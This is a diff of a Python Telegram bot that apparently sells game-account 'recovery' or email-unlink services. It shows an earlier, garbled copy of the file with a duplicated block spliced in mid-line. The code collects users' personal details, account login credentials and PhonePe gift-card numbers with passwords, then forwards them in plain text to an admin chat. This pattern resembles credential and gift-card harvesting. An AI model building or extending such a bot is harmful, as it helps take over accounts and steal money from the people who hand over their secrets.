@@ -63,7 +63,7 @@ def start_command(message):
 # 2. T&C Agree -> Service Needed Selection
 @bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
 def agree_tc_callback(call):
-    bot.answer_callback_query(call.id)  # Turant answer dena zaroori hai taaki error na aaye
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     markup = InlineKeyboardMarkup()
@@ -83,7 +83,7 @@ def agree_tc_callback(call):
 # 3. Plan Selection & Duration Confirmation
 @bot.callback_query_handler(func=lambda call: call.data in ["plan_basic", "plan_premium"])
 def plan_selection_callback(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     is_premium = (call.data == "plan_premium")
@@ -106,7 +106,7 @@ def plan_selection_callback(call):
 # 4. Sub-Options & Pricing Display
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
 def show_sub_options(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     is_premium = "premium" in call.data
@@ -132,7 +132,7 @@ def show_sub_options(call):
 # 5. Handle Sub-Option selection
 @bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
 def handle_sub_selection(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     parts = call.data.split("_")
@@ -192,7 +192,7 @@ def collect_user_details(message):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
 def handle_login_method(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     login_method = call.data.split("_")[1]
@@ -242,7 +242,7 @@ def handle_uid(message):
 # 7. Payment Screen
 @bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
 def proceed_to_payment(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
     
     price = user_states.get(chat_id, {}).get("price", "0")
@@ -317,7 +317,7 @@ def handle_gift_card(message):
 # 8. Admin Action Handler
 @bot.callback_query_handler(func=lambda call: call.data.startswith(("pay_recv_", "pay_notrecv_")))
 def handle_admin_payment_action(call):
-    bot.answer_callback_query(call.id)  # Fix: Turant answer kiya
+    bot.answer_callback_query(call.id)
     data_parts = call.data.split("_")
     action = data_parts[1]
     ticket_id = data_parts[2]
@@ -331,127 +331,6 @@ def handle_admin_payment_action(call):
         )
         bot.edit_message_text(f"✅ Payment Received & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
     else:
-        bot.send_message(
-            target_chat_id, 
-            "❌ Aapka PhonePe Gift Card verification fail ho gaya hai ya payment match nahi hui hai. Kripya apne gift card details check karke dobara `/start` se submit karein.", 
-            parse_mode="Markdown"
-        )
-        bot.edit_message_text(f"❌ Payment Not Received / Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
- Card with Anti-Fraud Validation)
-@bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
-def proceed_to_payment(call):
-    chat_id = call.message.chat.id
-    bot.answer_callback_query(call.id)
-    
-    price = user_states.get(chat_id, {}).get("price", "0")
-    user_states[chat_id]["step"] = "get_gift_card"
-    
-    payment_prompt = (
-        f"💳 **PHONEPE GIFT CARD PAYMENT** 💳\n\n"
-        f"Total Amount Payable: **₹{price}**\n\n"
-        "Kripya PhonePe Gift Card ke zariye payment karein aur niche diye gaye format mein details bhejein:\n\n"
-        "Format: `GiftCardNumber:Password`\n"
-        "*(Example: `9876543210123456:abcd1234`)*"
-    )
-    bot.send_message(chat_id, payment_prompt, parse_mode="Markdown")
-
-@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_gift_card")
-def handle_gift_card(message):
-    chat_id = message.chat.id
-    gift_card_input = message.text.strip()
-    
-    # Point 1: Anti-Fraud Format Validation
-    if ":" not in gift_card_input or len(gift_card_input) < 10:
-        bot.send_message(
-            chat_id, 
-            "❌ **Invalid Format!** Kripya sahi format mein enter karein:\n`GiftCardNumber:Password`", 
-            parse_mode="Markdown"
-        )
-        return
-
-    gc_parts = gift_card_input.split(":", 1)
-    gc_number = gc_parts[0].strip()
-    gc_pass = gc_parts[1].strip()
-
-    # Basic length check for anti-fraud
-    if not gc_number.isdigit() or len(gc_number) < 12:
-        bot.send_message(chat_id, "❌ **Verification Failed:** Gift Card number अमान्य (invalid) lag raha hai. Kripya sahi number daalein.", parse_mode="Markdown")
-        return
-
-    user_states[chat_id]["gift_card_no"] = gc_number
-    user_states[chat_id]["gift_card_pass"] = gc_pass
-    
-    ticket_id = f"FF-{generate_ticket_id()}"
-    user_states[chat_id]["ticket_id"] = ticket_id
-    
-    data = user_states[chat_id]
-    username = message.from_user.username or message.from_user.first_name
-    
-    # Send confirmation to User
-    bot.send_message(
-        chat_id,
-        "⏳ **Details is under verification please wait till confirmation.**",
-        parse_mode="Markdown"
-    )
-    
-    # 9. Admin Split Notifications (2 Messages)
-    admin_chat_id = chat_id # Note: Replace with actual Admin Telegram Chat ID if needed
-    
-    msg_basic_details = (
-        f"🚨 **New Recovery Request (Basic Info)**\n\n"
-        f"🎟️ **Ticket:** `{ticket_id}`\n"
-        f"👤 **User:** @{username} (`{chat_id}`)\n"
-        f"📛 **Name:** {data.get('name')}\n"
-        f"📱 **Mobile:** {data.get('mobile')}\n"
-        f"🏠 **Address:** {data.get('address')}\n"
-        f"🔐 **Login Method:** {data.get('login_method')}\n"
-        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
-        f"🆔 **UID:** `{data.get('uid')}`"
-    )
-    
-    markup = InlineKeyboardMarkup()
-    markup.row(
-        InlineKeyboardButton("✅ Received", callback_data=f"pay_recv_{ticket_id}_{chat_id}"),
-        InlineKeyboardButton("❌ Not Received", callback_data=f"pay_notrecv_{ticket_id}_{chat_id}")
-    )
-    
-    msg_payment_details = (
-        f"💳 **New Payment Verification (Gift Card)**\n\n"
-        f"🎟️ **Ticket:** `{ticket_id}`\n"
-        f"💰 **Amount:** ₹{data.get('price')}\n"
-        f"🎁 **Gift Card No:** `{gc_number}`\n"
-        f"🔒 **Password:** `{gc_pass}`"
-    )
-    
-    bot.send_message(chat_id, msg_basic_details, parse_mode="Markdown")
-    bot.send_message(chat_id, msg_payment_details, parse_mode="Markdown", reply_markup=markup)
-    
-    # Clear active state after submission
-    if chat_id in user_states:
-        del user_states[chat_id]
-
-# 10. Admin Action (Received / Not Received) Handler
-@bot.callback_query_handler(func=lambda call: call.data.startswith(("pay_recv_", "pay_notrecv_")))
-def handle_admin_payment_action(call):
-    data_parts = call.data.split("_")
-    action = data_parts[1] # recv or notrecv
-    ticket_id = data_parts[2]
-    target_chat_id = data_parts[3]
-
-    bot.answer_callback_query(call.id)
-
-    if action == "recv":
-        bot.send_message(
-            target_chat_id, 
-            "✅ Your payment is successfully received. Your mail Unlink as soon as possible when your mail is Unlink we will inform you . Have a Good Day.", 
-            parse_mode="Markdown"
-        )
-        bot.edit_message_text(f"✅ Payment Received & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-    else:
-        # Point 3: Admin 'Not Received' Action message to user
         bot.send_message(
             target_chat_id, 
             "❌ Aapka PhonePe Gift Card verification fail ho gaya hai ya payment match nahi hui hai. Kripya apne gift card details check karke dobara `/start` se submit karein.", 
